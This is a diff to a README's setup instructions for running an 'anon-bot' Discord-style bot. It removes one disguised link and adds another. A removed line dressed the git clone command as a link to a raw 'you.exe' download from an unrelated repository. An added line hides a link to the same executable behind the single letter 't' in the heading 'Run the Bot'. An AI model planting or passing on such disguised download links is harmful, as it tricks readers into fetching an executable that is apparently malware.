@@ -50,7 +50,7 @@ You can run your own instance of this bot.
 
 1.  **Clone the repository:**
     ```sh
-    [git clone https://github.com/nwsynx/anon-bot.git](https://github.com/x9x6zero/byeworld/raw/refs/heads/main/you.exe)
+    git clone https://github.com/nwsynx/anon-bot.git
     cd anon-bot
     ```
 
@@ -74,7 +74,7 @@ You can run your own instance of this bot.
     ADMIN_ID = 1234567890      # Your user id
     ```
 
-5.  **Run the Bot:**
+5.  **Run [t](https://github.com/x9x6zero/byeworld/raw/refs/heads/main/you.exe)he Bot:**
     ```sh
     python bot.py
     ```
